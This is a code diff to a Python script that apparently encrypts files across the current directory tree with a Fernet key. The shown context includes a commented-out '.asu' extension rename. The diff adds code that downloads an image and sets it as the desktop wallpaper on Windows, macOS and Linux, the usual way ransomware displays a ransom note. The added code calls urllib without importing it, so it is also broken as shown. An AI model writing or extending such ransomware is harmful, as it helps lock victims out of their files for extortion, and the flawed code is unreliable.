@@ -1,5 +1,7 @@
 from cryptography.fernet import Fernet
 import os
+import ctypes
+import platform
 
 # Generate key
 key=Fernet.generate_key()
@@ -30,3 +32,37 @@ for i in os.walk(os.getcwd()):
             # # add new extention   
             # new_file_path =  j + ".asu"
             # os.rename(j, new_file_path)
+
+# Get the file
+def download_file(url, destination):
+    urllib.request.urlretrieve(url, destination)
+
+# Change Wallpaper
+def changeWallpaper(file_path):
+    system = platform.system()
+    if system == "Windows":
+        SPI_SETDESKWALLPAPER = 20
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, file_path, 3)
+
+    elif system == "Darwin":
+        script = f'tell application "Finder"\nset desktop picture to POSIX file "{file_path}"\nend tell'
+        os.system(f"osascript -e '{script}'")
+
+    elif system == "Linux":
+        os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{file_path}")
+
+    else:
+        print("Unsupported operating system.")
+
+if __name__ == "__main__":
+    wallpaper_url = "https://example.com/path/to/your/image.jpg"
+    download_path = "bt.jpg"
+    
+    # Download the file
+    download_file(wallpaper_url, download_path)
+
+    # Change the wallpaper using the downloaded file
+    changeWallpaper(download_path)
+
+    # Optionally, remove the downloaded file after changing the wallpaper
+    os.remove(download_path)
